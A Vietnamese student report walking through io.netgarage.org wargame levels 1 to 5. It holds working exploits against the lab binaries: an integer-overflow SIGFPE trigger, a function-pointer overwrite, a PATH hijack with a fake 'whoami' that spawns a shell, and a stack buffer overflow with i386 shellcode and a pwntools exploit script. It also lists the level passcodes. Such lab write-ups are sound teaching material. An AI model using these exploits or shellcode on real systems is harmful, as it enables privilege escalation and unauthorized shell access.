# IO Netgarage Project Report

| Họ và tên       | MSSV     |
| --------------- | -------- |
| Dương Tiến Vinh | 19127631 |

## Chuẩn bị môi trường:

- Đầu tiên cần phải truy cập vào máy của [io.netgarage.org](https://io.netgarage.org/):

![Untitled](https://user-images.githubusercontent.com/64480713/182160242-779b0903-dced-466f-94c1-e704fcae7c70.png)

- Khi list các file thì có thể đọc file `README` để hiểu thêm về cách tham gia trò chơi:

![Untitled 1](https://user-images.githubusercontent.com/64480713/182160159-0db0fefd-f59c-4b8a-bcb3-f52900942c19.png)

- Các file cần phân tích để tìm pass:

![Untitled 2](https://user-images.githubusercontent.com/64480713/182160165-9000f256-63e1-4fb4-b12c-02a91a8f3328.png)

## Level 1:

- Khi phân tích file `level01`, ta có thể thấy file sẽ chạy instruction `cmp` để
  so sánh với 1 số `10Fh` = `271` để chương trình trả về kết quả đúng.

![Untitled 3](https://user-images.githubusercontent.com/64480713/182160167-f9d8d8d1-b764-4635-bc2d-0a09035df96d.png)

- Khi nhập đúng passcode thì có thể truy cập vào level2:

![Untitled 4](https://user-images.githubusercontent.com/64480713/182160172-0e97884c-6ae0-4edf-b872-80ee7d6cde1c.png)

> 💡 Passcode cho level 2 là: `XNWFtWKWHhaaXoKI`

- Đổi user sang `level02` bằng cách chạy lệnh sau và nhập password là passcode
  vừa lấy được:

```bash
su - level2
```

## Level 2:

- Ta có chương trình C như sau:

```c
//a little fun brought to you by bla

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void catcher(int a)
{
        setresuid(geteuid(),geteuid(),geteuid());
	printf("WIN!\n");
        system("/bin/sh");
        exit(0);
}

int main(int argc, char **argv)
{
	puts("source code is available in level02.c\n");

        if (argc != 3 || !atoi(argv[2]))
                return 1;
        signal(SIGFPE, catcher);
        return abs(atoi(argv[1])) / atoi(argv[2]);
}
```

- Có thể thấy ta có thể giải vấn đề này chỉ khi hàm `catcher` được gọi.
- Nhưng để có thể xử lý hàm `catcher`, cần phải vượt qua hàm `if`:
  - `argc`: argument count → Các arguments khi chạy hàm main phải `==` 3 thì mới
    vượt qua được hàm `if` này.
  - `argv`: argument vector. Ở đây ta có `!atoi(argv[2])` nghĩa là argument thứ
    2 (chuỗi `./level02` là `argv[0]`) phải khác 0.
- VD ở dưới là hợp lệ nhưng chưa giải quyết được vấn đề bởi vì hàm `catcher`
  chưa được gọi:

  ```bash
  ./level02 15 **3**
  ```

- Hàm `catcher` là một signal handler được register cho kernel để xử lý khi có
  signal loại `SIGFPE`. Vậy để chạy signal handler thì signal `SIGFPE` phải được
  gửi tới program để interrupt, từ đó chạy hàm `catcher`.
- Thông tin về signal `SIGFPE`:

  > The `SIGFPE` signal reports a fatal arithmetic error. Although the name is
  > derived from “floating-point exception”, this signal actually covers all
  > arithmetic errors, including **division by zero** and **overflow**. If a
  > program stores integer data in a location which is then used in a
  > floating-point operation, this often causes an “invalid operation”
  > exception, because the processor cannot recognize the data as a
  > floating-point number.

  Reference: [https://www.gnu.org/software/libc/manual/html_node/Program-Error-Signals.html](https://www.gnu.org/software/libc/manual/html_node/Program-Error-Signals.html)

- Vậy để send `SIGFPE` thì cần phải tạo lỗi **overflow**.

  - Ta cần tạo lỗi overflow cho expression sau:

  ```c
  abs(atoi(argv[1])) / atoi(argv[2])
  ```

  > C specifies signed integer representation as using 1 of 3 forms: sign and
  > magnitude, two’s complement, or ones’ complement. Given these forms, only
  > division by 0 and two’s complement division of `INT_MIN/-1` may overflow.

  Reference: [https://stackoverflow.com/a/30400252](https://stackoverflow.com/a/30400252)

- Ở hệ thống 64 bit thì số int nhỏ nhất là: `-(2**63)` = `-9223372036854775808`
- Bởi vì `argv[2]` phải khác 0, nên `argv[2]` sẽ là `-1`.
- Chạy chương trình với tham số sau:

  ```bash
  ./level02 -9223372036854775808 -1
  ```

![Untitled 5](https://user-images.githubusercontent.com/64480713/182160176-4f7942df-fced-4c73-bf43-0b64a8b59346.png)

> 💡 Passcode cho level 3 là: `OlhCmdZKbuzqngfz`

- Đổi user sang `level03` bằng cách chạy lệnh sau và nhập password là passcode
  vừa lấy được:

```bash
su - level3
```

## Level 3

- Ta có chương trình C như sau:

```c
//bla, based on work by beach

#include <stdio.h>
#include <string.h>

void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);

        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();

        return 0;
}
```

- Brute force: Thử nhiều ký tự `a` cho tới khi địa chỉ `functionpointer` thay
  đổi:

```bash
./level03 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaz
```

- Thử tới **76** chữ `a`, tới ký tự thứ 77 thì địa chỉ `functionpointer` sẽ thay
  đổi:

![Untitled 6](https://user-images.githubusercontent.com/64480713/182160178-671d0d85-584a-4498-a088-c95f46fa5a2f.png)

Và khi dịch chuyển từ `a` → `z` thì ký tự `z` sẽ cho ra kết quả đúng:

```bash
./level03 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaz
```

![Untitled 7](https://user-images.githubusercontent.com/64480713/182160182-5a411be8-b911-45fa-9134-8e1e8204425f.png)

> 💡 Passcode cho level 4 là: `7WhHa5HWMNRAYl9T`

- Đổi user sang `level04` bằng cách chạy lệnh sau và nhập password là passcode
  vừa lấy được:

```bash
su - level4
```

## Level 4:

- Ta có chương trình C như sau:

```c
//writen by bla
#include <stdlib.h>
#include <stdio.h>

int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f);
        printf("Welcome %s", username);

        return 0;
}
```

- Có thể thấy file C này không có chạy lệnh như: `execl("/bin/sh", "sh", NULL);`
  hay `system("/bin/sh");` như các level trước.
- Vậy thì ta có thể **giả mạo** file `whoami` để có thể thực thi các lệnh như
  mong muốn từ đó truy cập vào user `level5`:

```c
#include <stdlib.h>
int main(){
    system("/bin/sh");
    return 0;
}
```

- Đầu tiên tạo một thư mục tại `/tmp`:

```bash
mkdir /tmp/duckymomo20012
```

- Sau đó tạo file `whoami.c` và copy đoạn code trên:

![Untitled 8](https://user-images.githubusercontent.com/64480713/182160187-f84827a5-b93c-4425-b97d-41c9b8ee33ad.png)

- Compile file C:

```bash
gcc whoami.c -o whoami
```

> 🚧 Lưu ý việc tạo file và compile file `whoami` phải được thực hiện với user `level1`

![Untitled 9](https://user-images.githubusercontent.com/64480713/182160190-5461f914-bf78-4f36-b6a4-694a0628c4f9.png)

- Bởi vì hệ điều hành sẽ tìm file executable trong các folder trong `$PATH` và
  từ **trái sang phải**, folder nào **có file executable trước thì chạy file
  đó**. Nên ta phải prepend vị trí folder hiện tại là `tmp/duckymomo20012` vào
  `$PATH`.

> The $PATH is searched from beginning to end, with the first matching
> executable being run. So directories at the beginning of $PATH take precedence
> over those that come later. Executables in the current directory (.) are only
> executed if . is in $PATH (which it [usually
> isn't](http://www.faqs.org/faqs/unix-faq/faq/part2/section-13.html)
> ). There is no implicit inclusion of the current directory in the search path.

Reference: [https://superuser.com/a/238993](https://superuser.com/a/238993)

![Untitled 10](https://user-images.githubusercontent.com/64480713/182160192-766b8ff3-9bb9-47f9-bc9d-3a5082078e7e.png)

- Chạy lệnh sau để prepend vào `$PATH`:

```bash
PATH=.:$PATH
```

![Untitled 11](https://user-images.githubusercontent.com/64480713/182160194-a8a819e7-ab0a-4788-9168-fb6af6aae979.png)

> ⚠️ Lưu ý: phải có đầy đủ 2 ký tự **“.:”** và **“$PATH”**

- Sau đó chạy file `level04`:

```bash
/levels/level04
```

![Untitled 12](https://user-images.githubusercontent.com/64480713/182160200-94918979-2c67-4374-a998-98ca8852807a.png)

- Ta sẽ lấy được passcode:

![Untitled 13](https://user-images.githubusercontent.com/64480713/182160203-c90db6f4-41ca-4264-8a8b-e3dbdd470835.png)

> 💡 Passcode cho level 5 là: `DNLM3Vu0mZfX0pDd`

- Đổi user sang `level05` bằng cách chạy lệnh sau và nhập password là passcode
  vừa lấy được:

```bash
su - level5
```

## Level 5:

- Ta có chương trình C như sau:

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {

	char buf[128];

	if(argc < 2) return 1;

	strcpy(buf, argv[1]);

	printf("%s\n", buf);

	return 0;
}
```

- Đầu tiên ta cần debug chương trình:

```bash
level5@io:/levels$ gdb level05
```

![Untitled 14](https://user-images.githubusercontent.com/64480713/182160207-4cad0889-52bd-40ba-931f-09c7dfc62abd.png)

- Sử dụng `[gdb-peda](https://github.com/longld/peda)` để cải thiện “trải
  nghiệm” debug:

```bash
(gdb) source /usr/local/peda/peda.py
```

- Disassmble main

```bash
gdb-peda$ disass main
```

![Untitled 15](https://user-images.githubusercontent.com/64480713/182160208-4b160848-ec3e-49af-9283-ae92235296f5.png)

- Set breakpoint cho vị trí `main+58` và `main+63`:

```bash
gdb-peda$ b *main+58

gdb-peda$ b *main+63

```

![Untitled 16](https://user-images.githubusercontent.com/64480713/182160212-ca24d000-7206-49b6-948e-706e161a9643.png)

Hoặc:

```bash
gdb-peda$ b *0x080483ee

gdb-peda$ b *0x080483f3

```

- Đầu tiên ta thử chạy chương trình với 128 ký tự `A`:

```bash
gdb-peda$ run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

![Untitled 17](https://user-images.githubusercontent.com/64480713/182160214-5e049b65-fcb9-4626-a686-57b5607f503a.png)

- Step sang breakpoint tiếp theo:

```bash
gdb-peda$ continue
```

![Untitled 18](https://user-images.githubusercontent.com/64480713/182160218-c8f927f6-469d-4751-8063-85e1cc2c8fee.png)

- Đọc thông tin về frame:

```bash
gdb-peda$ info frame
```

![Untitled 19](https://user-images.githubusercontent.com/64480713/182160220-e1995fc3-78ba-4956-bee7-c621f1d67c0f.png)

- Đọc thông tin của thanh ghi `$esp`:

```bash
gdb-peda$ x /128bx $esp
```

> NOTE: `Enter` để đọc thêm các địa chỉ của thanh ghi

![Untitled 20](https://user-images.githubusercontent.com/64480713/182160223-4d3ac655-e727-48f0-b2be-21f7e8b89c6c.png)

- Có thể thấy địa chỉ bắt đầu của `buf` ở địa chỉ `0xbffffbb0` và return address
  của hàm `strcpy` được lưu tại địa chỉ `0xbffffc3c` (thông tin `eip` trong info
  frame).
  - Từ đó ta phải tính số byte còn lại để ghi đè lên return address của hàm
    `strcpy`:
    - `c3c - bb0` = `3132 - 2992` = 140 bytes + 4 bytes ghi đè lên return
      address.
- Chạy thử với **140** ký tự `A`:

```bash
gdb-peda$ run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

- Info frame:

![Untitled 21](https://user-images.githubusercontent.com/64480713/182160226-75e37f2d-a7ff-4d12-8f0f-8a4b70dc95aa.png)

- **Có sự thay đổi về `eip`** nhưng quan trọng là khi chạy với 140 ký tự `A` thì
  4 bytes tiếp theo sẽ là return address ở vị trí `0xbffffc2c`.
- Bây giờ sẽ overwrite return address với địa chỉ bắt đầu của `buf` là
  `0xbffffba0`:

```c
gdb-peda$ run $(printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xfb\xff\xbf")
```

> Dùng `printf` để truyền dữ liệu là hex vào chương trình.

![Untitled 22](https://user-images.githubusercontent.com/64480713/182160231-df748913-ca73-4b63-bab5-627ca222a96f.png)

- Có thể thấy địa chỉ return đã được đưa trở về đầu của `buf`.
- Ta có thể chạy shellcode để tự tạo shell bash bằng cách thay một số chữ `A`
  đầu bằng chuỗi shell code.
- Chuỗi shellcode sample có kích thước là **44**:

```bash
$ pwn shellcraft i386.linux.sh
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/misskanari/.pwntools-cache/update to 'never'.
[*] You have the latest version of Pwntools (3.12.0)
6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80
```

```bash
\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80
```

Reference: [https://docs.pwntools.com/en/stable/shellcraft/i386.html#pwnlib.shellcraft.i386.linux.sh](https://docs.pwntools.com/en/stable/shellcraft/i386.html#pwnlib.shellcraft.i386.linux.sh)

- Ta sẽ thay ký tự `A` thành `\x90`.
- Sau khi **giảm đi 44 ký tự `\x90` ở đầu** và **prepend chuỗi shellcode** và
  **append địa chỉ trả về** ta được chuỗi như sau:

```bash
gdb-peda$ run $(printf "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xa0\xfb\xff\xbf")
```

Hoặc có thể dùng python để truyền chuỗi vào chương trình:

```c
gdb-peda$ run $(python -c 'print "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xa0\xfb\xff\xbf"')
```

![Untitled 23](https://user-images.githubusercontent.com/64480713/182160234-210d2d91-3bfb-443e-95a9-fe1640e21948.png)

> 💡 User vẫn là `level5` bởi vì chạy trong chương trình debug gdb

> Tuy nhiên khi pass argument vào chương trình `level05` thì em lại gặp lỗi:
> `Segmentation fault`. Nên em phải tạo 1 file python sử dụng library
> `[pwntools](https://docs.pwntools.com/en/stable/)` như sau:

- Tạo file `[exploit.py](http://exploit.py)` trong thư mục `tmp/duckymomo20012`:

```python
from pwn import *

payload = "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xa0\xfb\xff\xbf"

p = process(["/levels/level05", payload])
p.interactive()
```

- Và chạy file `exploit.py`, ta sẽ có quyền truy cập vào user `level6`:

![Untitled 24](https://user-images.githubusercontent.com/64480713/182160239-2d299030-cf99-47d1-b499-c0724551049b.png)

> 💡 Passcode cho level 6 là: `fQ8W8YlSBJBWKV2R`

- Đổi user sang `level06` bằng cách chạy lệnh sau và nhập password là passcode
  vừa lấy được:

```bash
su - level6
```

## Tài liệu tham khảo:

- Tallan. 2022. *Exploring Buffer Overflows in C, Part Two: The Exploit | Tallan*
  .
  [online](https://www.tallan.com/blog/2019/04/04/exploring-buffer-overflows-in-c-part-two-the-exploit)
  Available at:
  <https://www.tallan.com/blog/2019/04/04/exploring-buffer-overflows-in-c-part-two-the-exploit/>
  [Accessed 31 July 2022].
- 2022. *Format String Exploitation-Tutorial*
  .
  [ebook](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)
  Available at:
  <https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf>
  [Accessed 31 July 2022].
